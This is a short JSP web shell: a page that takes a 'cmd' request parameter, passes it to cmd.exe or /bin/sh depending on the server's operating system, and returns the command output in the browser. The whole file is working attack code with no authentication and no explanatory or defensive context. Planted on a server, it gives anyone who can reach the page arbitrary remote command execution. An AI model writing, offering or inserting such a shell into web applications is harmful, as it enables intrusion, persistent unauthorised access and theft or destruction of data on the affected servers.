<%@ page import="java.io.*" %>
<%

Process p;
String s, cmd, os;

cmd = request.getParameter("cmd");

os = System.getProperty("os.name");

String [] params;
if (os.indexOf("Windows") > -1) {
        params = new String [] {"cmd.exe", "/c", cmd};
}
else {
        params = new String [] {"/bin/sh", "-c", cmd};
}

out.print("<pre>");

if (cmd != null) {
    p = Runtime.getRuntime().exec(params);

    BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));

    BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));

    while ((s = stdInput.readLine()) != null) {
        out.println(s); 
    }

    while ((s = stdError.readLine()) != null) {
        System.out.println(s);
    }
}

out.print("</pre>");
%>
